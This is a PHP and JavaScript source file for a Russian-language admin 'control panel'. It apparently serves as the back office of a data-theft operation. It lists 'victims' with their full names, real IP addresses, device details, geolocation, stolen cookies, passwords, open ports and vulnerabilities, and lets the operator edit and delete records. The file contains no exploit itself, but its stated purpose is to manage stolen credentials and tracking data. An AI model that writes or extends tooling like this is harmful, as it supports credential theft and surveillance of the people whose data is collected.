<?php
session_start();

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: login.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Панель управления</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color:rgb(109, 240, 34);
        }
        input[type="text"] {
            width: 100%;
            box-sizing: border-box;
        }
        button {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>Панель управления</h1>
    <table id="victimsTable">
        <thead>
            <tr>
                <th>ID</th>
                <th>ФИО</th>
                <th>Реальный IP</th>
                <th>Информация об устройстве</th>
                <th>Геолокация</th>
                <th>Кукисы</th>
                <th>Пароли</th>
                <th>Открытые порты</th>
                <th>Уязвимости</th>
                <th>Действия</th>
            </tr>
        </thead>
        <tbody>
        </tbody>
    </table>

    <script>
        const VICTIMS_URL = 'v2/admin/functions/get_victims.php';
        const UPDATE_VICTIM_URL = 'v2/admin/functions/update_victim.php';
        const DELETE_VICTIM_URL = 'v2/admin/functions/delete_victim.php';

        function loadVictims() {
            fetch(VICTIMS_URL)
                .then(response => response.json())
                .then(data => {
                    const tableBody = document.querySelector('#victimsTable tbody');
                    tableBody.innerHTML = '';
                    data.forEach(victim => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${victim.id}</td>
                            <td><input type="text" value="${victim.fullName}" data-field="fullName"></td>
                            <td><input type="text" value="${victim.realIP}" data-field="realIP"></td>
                            <td><input type="text" value="${victim.deviceInfo}" data-field="deviceInfo"></td>
                            <td><input type="text" value="${victim.geoInfo}" data-field="geoInfo"></td>
                            <td><input type="text" value="${victim.cookies}" data-field="cookies"></td>
                            <td><input type="text" value="${victim.passwords}" data-field="passwords"></td>
                            <td><input type="text" value="${victim.openPorts}" data-field="openPorts"></td>
                            <td><input type="text" value="${victim.vulnerabilities}" data-field="vulnerabilities"></td>
                            <td>
                                <button onclick="updateVictim(${victim.id}, this)">Сохранить</button>
                                <button onclick="deleteVictim(${victim.id})">Удалить</button>
                            </td>
                        `;
                        tableBody.appendChild(row);
                    });
                });
        }

        function updateVictim(id, button) {
            const row = button.closest('tr');
            const fields = row.querySelectorAll('input[data-field]');
            const data = {};
            fields.forEach(field => {
                data[field.getAttribute('data-field')] = field.value;
            });

            fetch(UPDATE_VICTIM_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ id: id, ...data }),
            })
            .then(response => response.text())
            .then(result => {
                alert(result);
                loadVictims();
            });
        }

        function deleteVictim(id) {
            if (confirm('Вы уверены, что хотите удалить эту запись?')) {
                fetch(DELETE_VICTIM_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
					body: JSON.stringify({ id: id }),
                })
                .then(response => response.text())
                .then(result => {
                    alert(result);
                    loadVictims();
                });
            }
        }

        loadVictims();
    </script>
</body>
</html>